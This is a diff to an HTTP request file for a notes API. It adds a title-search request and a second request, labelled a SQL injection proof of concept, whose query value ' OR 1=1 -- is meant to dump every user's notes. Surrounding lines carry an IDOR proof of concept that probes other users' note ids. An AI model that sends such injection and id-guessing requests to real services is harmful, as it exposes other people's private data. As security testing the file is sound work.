@@ -27,6 +27,14 @@ Content-Type: application/json
 GET {{baseUrl}}/notes
 Authorization: Bearer {{token}}
 
+### Search notes by title
+GET {{baseUrl}}/notes/search?q=grocery
+Authorization: Bearer {{token}}
+
+### Search notes — SQLi PoC (dumps every note from every user, not just yours)
+GET {{baseUrl}}/notes/search?q=x%25' OR 1=1 --
+Authorization: Bearer {{token}}
+
 ### Get note by id (replace NOTE_ID with a sequential integer — this is the IDOR PoC, try ids that aren't yours)
 GET {{baseUrl}}/notes/NOTE_ID
 Authorization: Bearer {{token}}
